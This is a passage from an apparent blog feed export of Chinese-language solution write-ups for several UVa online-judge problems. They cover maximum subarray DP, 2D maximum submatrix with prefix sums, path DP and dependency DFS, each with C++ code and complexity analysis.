  <entry>
    <title>UVa10684</title>
    <url>/2020/06/23/UVa10684/</url>
    <content><![CDATA[<h1 id="UVa10684"><a href="#UVa10684" class="headerlink" title="UVa10684"></a>UVa10684</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><h2 id="想法1"><a href="#想法1" class="headerlink" title="想法1"></a>想法1</h2><p>直觀的看，暴力去找起點跟終點 $i,j$<br>複雜度$O(N^2)$</p>
<h3 id="Code1"><a href="#Code1" class="headerlink" title="Code1"></a>Code1</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">10000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>,tmp ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			arr[i]=arr[i<span class="number">-1</span>]+tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">-2147483647</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;=n ; j++)&#123;</span><br><span class="line">				ans=max(ans, (arr[j]-arr[i<span class="number">-1</span>]));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans&gt;<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"The maximum winning streak is "</span>&lt;&lt;ans&lt;&lt;<span class="string">".\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Losing streak.\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>雖然說UVa上能過，但是超過1s實在太慢</p>
<h2 id="想法二"><a href="#想法二" class="headerlink" title="想法二"></a>想法二</h2><p>對於每個點來說都只有 取 跟 不取 兩種狀態，針對兩種狀態可以寫出DP式<br>定義$DP[i][j]$表示當第$i$個為取或不取時的最大值，$j=0$表不取，$j=1$表取<br>則可得</p>
<ul>
<li>$DP[i][0] = 0$</li>
<li>$DP[i][1] = max(DP[i-1][1]+arr[i], DP[i-1][0]+arr[i])$</li>
</ul>
<p>因為必須保證取的段是連續的，所以當不取時就會是0</p>
<h3 id="Code2"><a href="#Code2" class="headerlink" title="Code2"></a>Code2</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">10005</span>],dp[<span class="number">10005</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">-2147483647</span>;</span><br><span class="line">		dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">		dp[<span class="number">0</span>][<span class="number">1</span>]=arr[<span class="number">0</span>];</span><br><span class="line">		ans=max(ans,dp[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			dp[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">			dp[i][<span class="number">1</span>]=max(dp[i<span class="number">-1</span>][<span class="number">1</span>]+arr[i], dp[i<span class="number">-1</span>][<span class="number">0</span>]+arr[i]);</span><br><span class="line">			ans=max(ans,dp[i][<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans&lt;=<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Losing streak.\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"The maximum winning streak is "</span>&lt;&lt;ans&lt;&lt;<span class="string">".\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="想法3"><a href="#想法3" class="headerlink" title="想法3"></a>想法3</h2><p>針對想法2可以再做改良<br>可以發現到其實無論如何$DP[i][0] = 0$恆成立，所以其實沒必要存在<br>因此DP式化簡為 $DP[i]=max(DP[i-1]+arr[i],arr[i])$</p>
<h3 id="Code3"><a href="#Code3" class="headerlink" title="Code3"></a>Code3</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">10005</span>],dp[<span class="number">10005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=max(<span class="number">-2147483647</span>,arr[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			dp[i]=max(dp[i<span class="number">-1</span>]+arr[i],arr[i]);</span><br><span class="line">			ans=max(ans,dp[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans&lt;=<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Losing streak.\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"The maximum winning streak is "</span>&lt;&lt;ans&lt;&lt;<span class="string">".\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每次狀態轉移複雜度為 $O(1)$<br>而須轉移$n$次，總複雜度 $O(n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11743</title>
    <url>/2020/07/02/UVa10812/</url>
    <content><![CDATA[<h1 id="UVa10812"><a href="#UVa10812" class="headerlink" title="UVa10812"></a>UVa10812</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10812" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10812</a><br>給兩隊比賽比分合與比分差的絕對值，求兩隊分數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>假設兩隊分數分別為 $A$ $B$<br>$\frac{((A+B)+(A-B))}{2}=A$<br>則可再透過 $(A+B)-A$ 獲得 $B$<br>再檢查兩者是否合理即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">		<span class="keyword">int</span> a=(n+m)/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">int</span> b=n-a;</span><br><span class="line">		<span class="keyword">if</span>(a&lt;<span class="number">0</span> || b&lt;<span class="number">0</span> || <span class="built_in">abs</span>(a-b)!=m)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"impossible\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">" "</span>&lt;&lt;b&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(1)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa108</title>
    <url>/2020/07/02/UVa108/</url>
    <content><![CDATA[<h1 id="UVa108"><a href="#UVa108" class="headerlink" title="UVa108"></a>UVa108</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?108" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?108</a><br>給一個 $n \times n$ 的陣列，求最大的子區域元素和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>枚舉直行的左界右界，從最上列開始往下加，每次更新最大答案<br>在列的部分希望能做到 $O(1)$ 求解<br>可以想到前綴和，將每列的元素與前一個元素相加<br>$sum[i][j] = sum[i][j-1] + arr[i][j]$<br>如此一來當我們想求第 $i$ 列的 $j$～$k$行元素總和<br>$sum[i][k]-sum[i][j-1]$即可得解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">105</span>][<span class="number">105</span>],col[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=n ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			col[i][j] = col[i][j<span class="number">-1</span>]+arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;=n ; j++)&#123;</span><br><span class="line">			<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span> ; k&lt;=n ; k++)&#123;</span><br><span class="line">				sum+=col[k][j]-col[k][i<span class="number">-1</span>];</span><br><span class="line">				ans=max(ans,sum);</span><br><span class="line">				<span class="keyword">if</span>(sum&lt;<span class="number">0</span>) sum=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(n^2)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>前綴和</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10702</title>
    <url>/2020/06/24/UVa10702/</url>
    <content><![CDATA[<h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10702" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10702</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>從 $i$ 走到 $j$ 可以先經過 $k$<br>定義 $DP[n][i][j]$ 表示從 $i$ 走$n$步到 $j$ 的最大價值<br>轉移式: $DP[n][i][j] = max(DP[n][i][j], DP[n-1][i][k] + DP[1][k][j])$<br>且 $DP[1][i][j] = arr[i][j] (i \neq j)$<br>要記得當$i=j$時要走一步是不可能的</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> c,s,e,t,arr[<span class="number">105</span>][<span class="number">105</span>],dp[<span class="number">1005</span>][<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; last;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DP</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> (i==j) ? dp[n][i][j]=<span class="number">-2147483647</span> : dp[n][i][j]=arr[i][j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(dp[n][i][j])&#123;</span><br><span class="line">		<span class="keyword">return</span> dp[n][i][j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span> ; k&lt;=c ; k++)&#123;</span><br><span class="line">		dp[n][i][j]=max(dp[n][i][j], DP(n<span class="number">-1</span>,i,k)+DP(<span class="number">1</span>,k,j));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(dp[n][i][j])</span><br><span class="line">		<span class="keyword">return</span> dp[n][i][j];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">-2147483647</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;c&gt;&gt;s&gt;&gt;e&gt;&gt;t &amp;&amp; c)&#123;</span><br><span class="line">		<span class="keyword">while</span>(!last.empty())last.pop_back();</span><br><span class="line">		<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=c ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; j&lt;=c ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,tmp ; i&lt;e ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			last.push_back(tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> i: last)&#123;</span><br><span class="line">			ans=max(ans,DP(t,s,i));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>共有 $tn^2$ 種狀態，每種狀態轉移複雜度為 $O(2)$<br>每筆測資複雜度為 $O(tn^2)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10926</title>
    <url>/2020/06/17/UVa10926/</url>
    <content><![CDATA[<h1 id="UVa10926"><a href="#UVa10926" class="headerlink" title="UVa10926"></a>UVa10926</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10926" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10926</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接對於每個依賴遞迴下去，遇到相同的避掉</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,k,l;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line">pii ans;</span><br><span class="line"><span class="keyword">bool</span> used[<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rec</span><span class="params">(<span class="keyword">int</span> px)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> dep=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">105</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(v[px][i]==<span class="number">-1</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//avoid same point occur</span></span><br><span class="line">		<span class="keyword">if</span>(used[v[px][i]])&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			used[v[px][i]]=<span class="literal">true</span>;</span><br><span class="line">			dep += (rec(v[px][i])+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dep;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="comment">//init</span></span><br><span class="line">		ans = make_pair(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">105</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">105</span> ; j++)&#123;</span><br><span class="line">				v[i][j]=<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//input</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;k ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;l;</span><br><span class="line">				v[i][j]=l;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//rec every point</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>,tmp ; i&lt;=n ; i++)&#123;</span><br><span class="line">			tmp = rec(i);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">105</span> ; i++)&#123;</span><br><span class="line">				used[i]=<span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(tmp &gt; ans.first)&#123;</span><br><span class="line">				ans = make_pair(tmp,i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans.second&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>每次遞迴最多T個依賴都遞迴到</p>
<ul>
<li>初始化<br>  $O(N^2)$</li>
<li>rec<br>  $O(NT)$ 大約等於 $O(N^2)$<br>整體複雜度: $O(N^2)$</li>
</ul>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>DFS</tag>
        <tag>recursive</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11258</title>
    <url>/2020/06/23/UVa11258/</url>
    <content><![CDATA[<h1 id="UVa11258"><a href="#UVa11258" class="headerlink" title="UVa11258"></a>UVa11258</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11258" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11258</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>定義$DP[i][j]$為 $i$ ~ $j$ 的最佳解<br>設定轉移式 $DP[i][j] = max(DP[i][j], DP[i][k]+DP[k+1][j])$<br>其中， $k$ 符合 $i\leq k \leq j$<br>起初，我們可以假設$DP[i][j]$為 $i$ ~ $j$ 的數值<br>如果超過INT範圍則設定為0，也就是不會有這樣的可能<br>接下來針對每個$DP[i][j]$找最大值，答案即為$DP[0][s.size()-1]$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,dp[<span class="number">205</span>][<span class="number">205</span>];</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">str_to_int</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> now=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">		now*=<span class="number">10</span>;</span><br><span class="line">		now+=(s[l]-<span class="string">'0'</span>);</span><br><span class="line">		l++;</span><br><span class="line">		<span class="keyword">if</span>(now&gt;INT_MAX)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> now;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i ; j&lt;s.size() ; j++)&#123;</span><br><span class="line">				dp[i][j]=str_to_int(i,j);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; 